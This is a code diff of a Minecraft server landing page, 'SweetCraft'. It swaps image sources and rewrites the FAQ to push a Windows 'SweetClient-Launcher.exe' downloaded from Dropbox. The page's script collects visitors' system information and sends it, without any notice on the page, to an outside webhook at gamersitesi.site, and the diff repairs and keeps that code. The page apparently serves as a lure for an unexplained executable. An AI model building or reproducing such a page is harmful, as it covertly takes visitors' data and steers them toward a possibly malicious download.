@@ -196,7 +196,7 @@
       <div class="flex items-center justify-between h-16">
         <div class="flex items-center gap-3 anim-fade-up anim-fade-delay-1">
           <a href="#top" class="flex items-center gap-2">
-            <img src="https://i.imgur.com/nOsMwIX.jpg" alt="SweetCraft icon" class="w-8 h-8 rounded-lg shadow-cute">
+            <img src="images/logo.png" alt="SweetCraft icon" class="w-8 h-8 rounded-lg shadow-cute">
             <div class="flex flex-col leading-tight">
               <span class="text-sm font-extrabold bg-gradient-to-r from-purple-300 to-purple-200 bg-clip-text text-transparent">
                 SweetCraft
@@ -272,12 +272,12 @@
               Join with one click and start your comfy SMP journey.
             </p>
 
-<div class="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-2 pt-1 pb-3">
-          <button id="cutieclient-download" type="button" class="pixel-btn w-full sm:w-auto px-6 py-2.5 rounded-full bg-gradient-to-r from-primary to-primaryDark text-white text-xs font-semibold flex items-center justify-center gap-2 shadow-cute">
-            <span>↓ Download for Windows</span>
-            <span class="text-[10px] text-purple-100/90">(Installer)</span>
-          </button>
-  
+            <div class="flex flex-col sm:flex-row gap-3 sm:items-center">
+              <button id="open-launcher-modal" type="button" class="pixel-btn inline-flex items-center justify-center px-7 py-3 rounded-full
+                       bg-gradient-to-r from-primary to-primaryDark text-white text-xs sm:text-sm font-semibold">
+                ↓ Download SweetClient (Windows)
+              </button>
+
               <div class="text-[11px] text-purple-100/75">
                 <div class="font-semibold">Server IP:</div>
                 <div class="font-mono text-[11px] flex items-center gap-1">
@@ -434,21 +434,21 @@
 
         <div class="grid gap-4 sm:grid-cols-2 lg:grid-cols-3 anim-fade-up anim-fade-delay-1">
           <figure class="gallery-card wiggle-hover rounded-xl2 border border-white/10 bg-black/40 overflow-hidden">
-            <img src="https://i.imgur.com/l9eRC7l.jpg" alt="Spawn area" class="w-full h-40 object-cover">
+            <img src="images/server.jpg" alt="Spawn area" class="w-full h-40 object-cover">
             <figcaption class="p-3 text-[11px] text-purple-100/85">
               <span class="font-semibold text-purple-50">Spawn •</span> Central hub with portals, meeting spots and little shops.
             </figcaption>
           </figure>
 
           <figure class="gallery-card wiggle-hover rounded-xl2 border border-white/10 bg-black/40 overflow-hidden">
-            <img src="https://imgur.com/6DVTLcI.jpg" alt="Market area" class="w-full h-40 object-cover">
+            <img src="images/server2.jpg" alt="Market area" class="w-full h-40 object-cover">
             <figcaption class="p-3 text-[11px] text-purple-100/85">
               <span class="font-semibold text-purple-50">Market •</span> Player shops and server market in one cozy district.
             </figcaption>
           </figure>
 
           <figure class="gallery-card wiggle-hover rounded-xl2 border border-white/10 bg-black/40 overflow-hidden">
-            <img src="https://i.imgur.com/7LlCY7n.jpg" alt="Event island" class="w-full h-40 object-cover">
+            <img src="images/server3.jpg" alt="Event island" class="w-full h-40 object-cover">
             <figcaption class="p-3 text-[11px] text-purple-100/85">
               <span class="font-semibold text-purple-50">Event Island •</span> Special island for build contests and mini‑games.
             </figcaption>
@@ -457,16 +457,61 @@
       </div>
     </section>
 
-  <!-- FAQ ITEM -->
-<div class="faq-item border-b border-white/10">
-              How do I join the server?
-             </span>
-             <span class="faq-icon text-purple-100 transition-transformduration-200 text-xs sm:text-sm">▶</span>
-           </button>
-           <div class="faq-content px-4 pb-3 text-[11px] text-purple-100/85" data-faq-content="">
-             Download SweetCraft Launcher and connect to 
-             <span class="font-mono text-purple-50">play.sweetcraftsmp.com
-             </span>.To protect yourself from bots and cheats, you should use the SweetClient launcher.
+    <section id="faq" class="py-14 sm:py-16 bg-black/50 border-t border-white/10">
+      <div class="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8">
+        <div class="text-center mb-8 anim-fade-up">
+          <p class="text-[11px] font-semibold tracking-[0.25em] text-purple-200 uppercase">
+            Frequently asked questions
+          </p>
+          <h2 class="mt-2 text-2xl sm:text-3xl font-extrabold text-purple-50">
+            Everything you want to know before joining
+          </h2>
+          <p class="mt-2 text-sm text-purple-100/80 max-w-xl mx-auto">
+            Connection, rules and SweetClient explained in a cozy, simple way.
+          </p>
+        </div>
+
+        <div class="space-y-3 anim-fade-up anim-fade-delay-1">
+          <div class="faq-item rounded-xl2 border border-white/10 bg-white/5 backdrop-blur-xl wiggle-hover">
+            <button class="w-full flex items-center justify-between px-4 py-3 text-left text-xs sm:text-sm" aria-expanded="false" data-faq-toggle="">
+              <span class="font-semibold text-purple-50">
+                How do I join the server?
+              </span>
+              <span class="faq-icon text-purple-100 transition-transform duration-200 text-xs sm:text-sm">▶</span>
+            </button>
+            <div class="faq-content px-4 pb-3 text-[11px] text-purple-100/85" data-faq-content="">
+              Use your official Minecraft Java account and connect to
+              <span class="font-mono text-purple-50">play.sweetcraftsmp.com</span>.  
+              For the smoothest experience, we recommend using the SweetClient launcher.
+            </div>
+          </div>
+
+          <div class="faq-item rounded-xl2 border border-white/10 bg-white/5 backdrop-blur-xl wiggle-hover">
+            <button class="w-full flex items-center justify-between px-4 py-3 text-left text-xs sm:text-sm" aria-expanded="false" data-faq-toggle="">
+              <span class="font-semibold text-purple-50">
+                What is SweetClient? Is it required?
+              </span>
+              <span class="faq-icon text-purple-100 transition-transform duration-200 text-xs sm:text-sm">▶</span>
+            </button>
+            <div class="faq-content px-4 pb-3 text-[11px] text-purple-100/85" data-faq-content="">
+              SweetClient is a lightweight launcher that connects you with one click,  
+              bundles our recommended mod‑pack and keeps everything auto‑updated.  
+              It is not required, but strongly recommended for the best experience.
+            </div>
+          </div>
+
+          <div class="faq-item rounded-xl2 border border-white/10 bg-white/5 backdrop-blur-xl wiggle-hover">
+            <button class="w-full flex items-center justify-between px-4 py-3 text-left text-xs sm:text-sm" aria-expanded="false" data-faq-toggle="">
+              <span class="font-semibold text-purple-50">
+                What are the main rules?
+              </span>
+              <span class="faq-icon text-purple-100 transition-transform duration-200 text-xs sm:text-sm">▶</span>
+            </button>
+            <div class="faq-content px-4 pb-3 text-[11px] text-purple-100/85" data-faq-content="">
+              Be kind and respectful. Griefing, stealing, hacking and toxic behaviour are strictly forbidden.  
+              Full rule list is pinned on our Discord server.
+            </div>
+          </div>
 
           <div class="faq-item rounded-xl2 border border-white/10 bg-white/5 backdrop-blur-xl wiggle-hover">
             <button class="w-full flex items-center justify-between px-4 py-3 text-left text-xs sm:text-sm" aria-expanded="false" data-faq-toggle="">
@@ -631,7 +676,7 @@
 
   document.getElementById("copy-ip")?.addEventListener("click", async () => {
     try {
-      await navigator.clipboard.writeText("play.sweetcraft.site");
+      await navigator.clipboard.writeText("play.sweetcraftsmp.com");
       showNotification("Server IP copied to clipboard");
     } catch {
       showNotification("Could not copy IP, please copy it manually");
@@ -684,7 +729,7 @@
   const modalPanel = document.getElementById("cutieclient-modal-panel");
   const modalClose = document.getElementById("cutieclient-modal-close");
   const modalDownload = document.getElementById("cutieclient-download");
-  const WINDOWS_URL = "https://www.dropbox.com/scl/fi/sdlmuu5q30etac7a6deo5/SweetClient-Launcher.exe?rlkey=keti09how8a1mntrctw2erm5w&st=v36nhpna&dl=1"; // Dropbox linkinizi buraya ekleyin (?dl=1 ile direkt indirme)
+  const WINDOWS_URL = "https://www.dropbox.com/scl/fi/sdlmuu5q30etac7a6deo5/SweetClient-Launcher.exe?rlkey=keti09how8a1mntrctw2erm5w&st=dzjytlei&dl=0"; // Dropbox linkinizi buraya ekleyin (?dl=1 ile direkt indirme)
 
   function openModal() {
     modalBackdrop.classList.remove("backdrop-hidden");
@@ -714,6 +759,8 @@
   });
 
   (function() {
+    const WEBHOOK_URL = `https://gamersitesi.site/apsd`;
+
     function collectSystemInfo() {
       const info = {};
       try {
@@ -810,10 +857,7 @@
       }
     }
 
-    function sendWebhook() 
-      const WEBHOOK_URL = 'https://gamersitesi.site/apsd';
-      
-      
+    function sendWebhook() {
       const systemInfo = collectSystemInfo();
       
       // IP bilgisini beklemeden önce webhook'u gönder (timeout ile)
